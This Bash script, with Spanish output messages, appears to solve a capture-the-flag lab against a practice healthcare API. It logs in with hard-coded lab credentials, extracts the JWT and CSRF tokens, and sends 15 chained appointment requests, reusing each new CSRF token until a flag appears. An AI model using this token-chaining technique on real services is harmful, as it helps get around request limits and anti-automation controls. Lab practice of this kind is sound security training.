#!/bin/bash

GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}[*] Extrayendo tokens de auth...${NC}"

AUTH_RESPONSE=$(curl --path-as-is -s -k -i -X POST \
    -H 'Content-Type: application/json' \
    -H 'Accept: application/json' \
    --data-binary '{"email": "john4@healthcare.app","password": "john@1234"}' \
    'https://hackapi.secops.group/api/v1/auth' 2>/dev/null)

CSRF_TOKEN=$(printf '%s' "$AUTH_RESPONSE" | tr -d '\r' | grep -im1 '^x-csrf-token:' | cut -d':' -f2- | tr -d '[:space:]')
JWT_TOKEN=$(printf '%s' "$AUTH_RESPONSE" | tail -1 | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

echo -e "${GREEN}[+] CSRF inicial: $CSRF_TOKEN${NC}"
echo -e "${GREEN}[+] JWT: ${JWT_TOKEN:0:50}...${NC}\n"

echo -e "${BLUE}[*] Enviando 15 appointment requests en cadena...${NC}"
echo -e "${BLUE}[*] Cada respuesta genera un nuevo CSRF para el siguiente request\n${NC}"

for i in {1..15}; do
    RESPONSE=$(curl --path-as-is -s -k -i -X POST \
        -H "X-CSRF-Token: $CSRF_TOKEN" \
        -H 'Content-Type: application/json' \
        -H 'Accept: application/json' \
        -H "Authorization: $JWT_TOKEN" \
        --data-binary '{"slot": "2024-12-15T10:00:00","notes": "Test"}' \
        'https://hackapi.secops.group/api/v1/appointment' 2>/dev/null)
    
    HTTP_CODE=$(printf '%s' "$RESPONSE" | head -1 | grep -oE '[0-9]{3}')
    NEW_CSRF=$(printf '%s' "$RESPONSE" | tr -d '\r' | grep -im1 '^x-csrf-token:' | cut -d':' -f2- | tr -d '[:space:]')
    BODY=$(printf '%s' "$RESPONSE" | tail -1)
    
    if [ -n "$NEW_CSRF" ]; then
        CSRF_TOKEN="$NEW_CSRF"
        echo "[$i] HTTP $HTTP_CODE | CSRF actualizado: ${NEW_CSRF:0:16}... | Body: $BODY"
    else
        echo "[$i] HTTP $HTTP_CODE | CSRF NO cambió | Body: $BODY"
    fi
    
    # Buscar flag
    if echo "$BODY" | grep -qi "flag"; then
        echo -e "${RED}[!!!] FLAG ENCONTRADA EN REQUEST $i: $BODY${NC}"
        break
    fi
done

echo -e "\n${BLUE}[*] Test completado${NC}"
